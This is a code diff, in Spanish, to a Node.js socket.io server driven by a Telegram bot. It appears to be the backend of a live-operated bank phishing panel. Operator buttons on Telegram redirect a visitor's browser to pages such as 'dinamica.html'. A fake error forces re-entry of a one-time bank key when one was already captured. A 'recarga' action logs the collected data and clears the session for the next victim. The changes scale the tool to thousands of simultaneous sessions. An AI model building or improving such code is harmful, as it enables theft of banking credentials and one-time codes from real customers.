@@ -44,18 +44,23 @@ const io = socketIO(server, {
     methods: ['GET', 'POST'],
     credentials: true
   },
-  // Configuración ULTRA ESTABLE para múltiples sesiones simultáneas sin desconexiones
-  pingInterval: 20000, // Ping cada 20 segundos (muy estable)
-  pingTimeout: 120000, // 2 MINUTOS de timeout - conexiones muy persistentes
-  upgradeTimeout: 30000, // 30 segundos para upgrade
-  maxHttpBufferSize: 1e8, // 100 MB
+  // Configuración ULTRA ROBUSTA para miles de sesiones simultáneas sin pérdida de conexión
+  pingInterval: 25000, // Ping cada 25 segundos - balance perfecto
+  pingTimeout: 180000, // 3 MINUTOS - conexiones MUY persistentes para alta carga
+  upgradeTimeout: 45000, // 45 segundos para upgrade bajo carga
+  maxHttpBufferSize: 5e8, // 500 MB - buffer grande para múltiples sesiones
   allowUpgrades: true,
-  perMessageDeflate: false,
-  httpCompression: false,
+  perMessageDeflate: false, // Desactivado para mejor rendimiento con muchas conexiones
+  httpCompression: true, // Activado para reducir bandwidth
   transports: ['websocket', 'polling'],
   allowEIO3: true,
-  connectTimeout: 60000, // 1 minuto para establecer conexión inicial
-  cookie: false
+  connectTimeout: 90000, // 1.5 minutos para conexión inicial bajo carga
+  cookie: false,
+  // Configuraciones adicionales para alta concurrencia
+  path: '/socket.io/',
+  serveClient: false, // No servir cliente para mejor rendimiento
+  pingIntervalMS: 25000,
+  pongTimeoutMS: 180000
 });
 const telegramBot = new TelegramBot(CONFIG.TELEGRAM.TOKEN, { 
   polling: false // Solo envío de mensajes, NO polling
@@ -199,19 +204,30 @@ class SessionRepository {
 
 const sessionRepo = new SessionRepository();
 
-// Limpieza automática de sesiones antiguas cada 30 minutos
+// Limpieza automática de sesiones antiguas - optimizada para alta concurrencia
 setInterval(() => {
   const now = new Date();
-  const SESSION_TIMEOUT = 24 * 60 * 60 * 1000; // 24 HORAS de inactividad
+  const SESSION_TIMEOUT = 6 * 60 * 60 * 1000; // 6 HORAS de inactividad
+  let cleaned = 0;
   
   for (let [socketId, session] of sessionRepo.sessions) {
     const inactiveTime = now - session.lastActivity;
     if (inactiveTime > SESSION_TIMEOUT) {
-      console.log(`🗑️ Limpiando sesión inactiva: ${session.sessionId} (inactiva ${Math.round(inactiveTime/60000)} minutos)`);
+      console.log(`🗑️ Limpiando sesión inactiva: ${session.sessionId} (${Math.round(inactiveTime/60000)} min)`);
       sessionRepo.delete(socketId);
+      cleaned++;
     }
   }
-}, 30 * 60 * 1000); // Cada 30 minutos
+  
+  if (cleaned > 0) {
+    console.log(`🧹 Limpieza completada: ${cleaned} sesiones eliminadas | Activas: ${sessionRepo.sessions.size}`);
+  }
+}, 15 * 60 * 1000); // Cada 15 minutos (menos agresivo para mejor rendimiento)
+
+// Log de estadísticas cada 5 minutos
+setInterval(() => {
+  console.log(`📊 ESTADÍSTICAS | Sesiones activas: ${sessionRepo.sessions.size} | Sockets conectados: ${io.sockets.sockets.size}`);
+}, 5 * 60 * 1000);
 
 // ========================================
 // TELEGRAM SERVICE (Service Layer)
@@ -356,11 +372,12 @@ class TelegramService {
 
     const socketId = session.socketId;
     
-    // Buscar socket directamente - sin reintentos innecesarios
+    // Búsqueda optimizada de socket - SIEMPRE debe encontrarlo si está conectado
     let socket = io.sockets.sockets.get(socketId);
     
-    // Si no está con ese socketId, buscar por sessionId (reconectado)
+    // Si no está con ese socketId o no está conectado, buscar por sessionId (reconectado)
     if (!socket || !socket.connected) {
+      console.log(`🔍 Buscando socket reconectado para sesión: ${sessionId}`);
       for (let [sid, s] of io.sockets.sockets) {
         if (s.connected) {
           const socketSession = sessionRepo.get(sid);
@@ -369,16 +386,18 @@ class TelegramService {
             session.socketId = sid;
             sessionRepo.sessions.delete(socketId);
             sessionRepo.sessions.set(sid, session);
-            console.log(`✅ Socket reconectado: ${sid}`);
+            sessionRepo.sessionIdIndex.set(sessionId, sid); // Actualizar índice
+            console.log(`✅ Socket reconectado encontrado: ${sid}`);
             break;
           }
         }
       }
     }
     
-    // Si NO hay socket conectado, responder y retornar
+    // Verificación final - si NO hay socket, responder y salir
     if (!socket || !socket.connected) {
-      console.error(`❌ Socket no disponible para sesión: ${sessionId}`);
+      console.error(`❌ Socket NO disponible para sesión: ${sessionId}`);
+      console.log(`📊 Sockets conectados totales: ${io.sockets.sockets.size}`);
       await this.bot.answerCallbackQuery(callbackQuery.id, {
         text: '❌ Cliente desconectado',
         show_alert: true
@@ -386,7 +405,7 @@ class TelegramService {
       return;
     }
 
-    console.log(`✅ Socket activo y conectado: ${sessionId}`);
+    console.log(`✅ Socket ACTIVO: ${sessionId} | ID: ${socket.id}`);
 
     // Procesar acciones
     if (action === 'req') {
@@ -401,19 +420,37 @@ class TelegramService {
 
       const request = requests[subaction];
       if (request) {
-        // Responder callback INMEDIATAMENTE
-        await this.bot.answerCallbackQuery(callbackQuery.id, { text: request.text });
+        // Si es solicitud de RECARGA, limpiar sesión completamente para nuevo usuario
+        if (subaction === 'recarga') {
+          console.log(`📦 RECARGA solicitada - Limpiando sesión ${sessionId} para nuevo usuario`);
+          // Limpiar todos los datos acumulados pero mantener sessionId para reconexiones
+          const oldData = { ...session.data };
+          session.data = {};
+          sessionRepo.sessions.set(socket.id, session); // Actualizar en memoria
+          console.log(`✅ Datos limpiados. Anterior:`, JSON.stringify(oldData));
+          console.log(`✅ Nueva sesión lista para recibir datos frescos`);
+        }
         
         // Si es solicitud de dinámica y ya existe una clave previa, redirigir con error
         let redirectUrl = request.page;
         if (subaction === 'dinamica' && session.data.dinamica) {
-          console.log('⚠️ Clave dinámica previa detectada - redirigiendo con error');
+          console.log(`⚠️ Clave dinámica previa detectada - redirigiendo con error`);
           redirectUrl = 'dinamica.html?error=true';
         }
         
-        // Emitir redirección
+        // Responder callback INMEDIATAMENTE
+        await this.bot.answerCallbackQuery(callbackQuery.id, { text: request.text });
+        
+        // Emitir redirección (SIEMPRE debe llegar)
         socket.emit('redirect', { url: redirectUrl });
-        console.log(`🔄 Redirección enviada: ${redirectUrl}`);
+        console.log(`🔄 Redirección enviada: ${redirectUrl} | Socket: ${socket.id}`);
+        
+        // Verificar que el socket sigue conectado después de emitir
+        if (socket.connected) {
+          console.log(`✅ Socket sigue conectado después de redirección`);
+        } else {
+          console.error(`❌ Socket se desconectó después de emitir redirección`);
+        }
         
         // Enviar mensaje de confirmación a Telegram (en background, no bloquear)
         const confirmMessage = `✅ *Comando Ejecutado*\n\n${request.emoji} *Acción:* ${request.label}\n🆔 *Sesión:* \`${sessionId}\`\n⏰ ${new Date().toLocaleString('es-CO')}\n\n_El usuario ha sido redirigido a ${request.page}_`;
